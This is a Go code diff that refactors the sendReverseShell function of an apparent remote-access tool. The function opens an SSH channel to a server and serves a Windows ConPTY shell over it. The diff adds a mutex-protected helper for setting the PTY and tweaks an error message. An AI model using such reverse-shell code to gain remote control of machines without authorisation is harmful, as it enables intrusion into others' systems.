@@ -14,7 +14,6 @@ import (
 )
 
 func (s *Session) sendReverseShell(request *ssh.Request) {
-
 	channel, _, openErr := s.sshConn.OpenChannel("session", nil)
 	if openErr != nil {
 		s.Errorf("failed to open a \"session\" channel to server")
@@ -33,7 +32,7 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 		var termSize interpreter.TermSize
 		if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
 			// If error term initializes with size 0 0
-			s.Errorf("%v", unMarshalErr)
+			s.Errorf("--%v", unMarshalErr)
 		}
 
 		// Notify server we will be sending a PTY
@@ -42,7 +41,8 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 			s.Errorf("pty-req %v", errSSHReq)
 		}
 
-		s.interpreter.Pty, _ = conpty.Start(s.interpreter.Shell, conpty.ConPtyDimensions(termSize.Cols, termSize.Rows))
+		conPty, _ := conpty.Start(s.interpreter.Shell, conpty.ConPtyDimensions(termSize.Cols, termSize.Rows))
+		s.setConPty(conPty)
 		defer func() { _ = s.interpreter.Pty.Close() }()
 
 		// Notify server we will send a Reverse Shell
@@ -80,4 +80,10 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 			s.Errorf("%v", runErr)
 		}
 	}
+}
+
+func (s *Session) setConPty(conPty *conpty.ConPty) {
+	s.sessionMutex.Lock()
+	defer s.sessionMutex.Unlock()
+	s.interpreter.Pty = conPty
 }
